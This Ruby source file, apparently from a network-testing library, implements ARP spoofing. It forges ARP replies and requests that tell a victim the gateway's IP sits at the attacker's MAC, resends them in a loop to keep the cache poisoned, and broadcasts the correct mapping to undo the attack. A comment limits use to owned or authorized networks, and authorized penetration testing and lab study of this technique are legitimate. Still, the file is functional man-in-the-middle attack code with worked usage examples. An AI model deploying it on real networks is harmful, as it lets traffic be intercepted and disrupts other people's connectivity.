# frozen_string_literal: true

require "datalink/arp"
require "datalink/socket"

module Datalink
  # ARP spoofing primitives: craft and send ARP messages that advertise a
  # false IP-to-MAC mapping, so victims send to you the traffic they meant
  # for someone else.
  #
  # ------------------------------------------------------------------
  #  LEGAL / ETHICAL NOTICE
  #  Sending forged ARP onto a network you do not own or are not
  #  explicitly authorized to test is illegal in most jurisdictions and
  #  disrupts other people's connectivity. Use this only on your own lab
  #  network or under a written authorization to test. You are
  #  responsible for how you use it.
  # ------------------------------------------------------------------
  #
  # A spoof convinces a victim that some IP (usually the gateway) is at
  # the attacker's MAC:
  #
  #   s = Datalink::Spoof.new(socket, attacker_mac: my_mac)
  #   # Tell 192.168.1.50 that the gateway 192.168.1.1 is at my MAC:
  #   s.poison(victim_ip: "192.168.1.50", victim_mac: victim_mac,
  #            spoofed_ip: "192.168.1.1")
  #
  # To keep a cache poisoned, ARP entries expire, so resend on an
  # interval (see #poison_loop) or let Attack::ArpPoison manage it.
  class Spoof
    def initialize(socket, attacker_mac:)
      @socket = socket
      @attacker_mac = attacker_mac.is_a?(MAC) ? attacker_mac : MAC.new(attacker_mac)
    end

    # Send one forged ARP reply: "spoofed_ip is at attacker_mac", unicast
    # to the victim. A gratuitous reply is the quiet, reliable way to
    # poison a cache (no request needs to have been seen).
    def poison(victim_ip:, victim_mac:, spoofed_ip:, as_mac: @attacker_mac)
      arp = ARP.new(
        opcode: ARP::REPLY,
        sender_mac: as_mac, sender_ip: spoofed_ip,
        target_mac: victim_mac, target_ip: victim_ip
      )
      @socket.send(arp.to_frame)
      arp
    end

    # Some stacks prefer to act on requests. This sends a forged request
    # ("who has victim_ip? tell spoofed_ip at attacker_mac"), which also
    # plants the spoofed mapping in many implementations.
    def poison_via_request(victim_ip:, victim_mac:, spoofed_ip:, as_mac: @attacker_mac)
      arp = ARP.new(
        opcode: ARP::REQUEST,
        sender_mac: as_mac, sender_ip: spoofed_ip,
        target_mac: victim_mac, target_ip: victim_ip
      )
      @socket.send(arp.to_frame(dst: victim_mac))
      arp
    end

    # Resend the poison every +interval+ seconds, for +duration+ seconds
    # (or forever if duration is nil). Blocks; run it in a thread if you
    # need to do other work.
    def poison_loop(victim_ip:, victim_mac:, spoofed_ip:, interval: 2, duration: nil)
      deadline = duration && (monotonic + duration)
      loop do
        poison(victim_ip: victim_ip, victim_mac: victim_mac, spoofed_ip: spoofed_ip)
        break if deadline && monotonic >= deadline

        sleep(interval)
      end
    end

    # Undo the damage: broadcast the *correct* mapping so caches heal
    # quickly instead of waiting to time out. Call this when you stop.
    #   restore(ip: gateway_ip, mac: real_gateway_mac)
    def restore(ip:, mac:, repeat: 4)
      real_mac = mac.is_a?(MAC) ? mac : MAC.new(mac)
      arp = ARP.new(
        opcode: ARP::REPLY,
        sender_mac: real_mac, sender_ip: ip,
        target_mac: MAC.broadcast, target_ip: ip
      )
      frame = arp.to_frame(dst: MAC.broadcast)
      repeat.times { @socket.send(frame) }
      arp
    end

    private

    def monotonic
      Process.clock_gettime(Process::CLOCK_MONOTONIC)
    end
  end
end
